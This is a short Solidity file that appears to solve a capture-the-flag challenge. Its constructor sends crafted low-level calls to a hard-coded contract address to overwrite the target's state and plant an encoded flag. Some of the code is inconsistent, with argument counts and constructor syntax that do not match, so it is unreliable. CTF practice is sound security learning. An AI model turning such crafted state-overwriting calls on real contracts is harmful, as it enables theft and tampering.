pragma solidity ^0.4.10;

contract Launcher{

}

contract EasyBomb{
   
}



contract LauncherAttack{
     bool private hasExplode ;
    address private launcher_address;
    bytes32 private password;
    bool public power_state = false;
    bytes4 constant launcher_start_function_hash = bytes4(keccak256("setdeadline(uint256)"));
    Launcher launcher;
    uint256 public deadline = 999999999999999;
    function setdeadline(uint256 _deadline) public {
        power_state = false; 
    }
   

 
}
  //0x9481889fFA5e19C7C583ad1706f66c35B2114837
contract hackeasyboom{
    EasyBomb easyBomb;
  
    constructor() {
         EasyBomb easyBomb = EasyBomb(0x585419fc648a92eab31ef225d739af16a39cf8cc);
        address(easyBomb).call(abi.encodeWithSignature("setCountDownTimer(uint256)",
         0x00000000000000000000009481889fFA5e19C7C583ad1706f66c35B211483700, 
         0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));
          address(easyBomb).call(abi.encodeWithSignature("setCountDownTimer(uint256)",
         0x00000000000000000000009481889fFA5e19C7C583ad1706f66c35B211483700, 
         0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));
    }
 
     
        
}
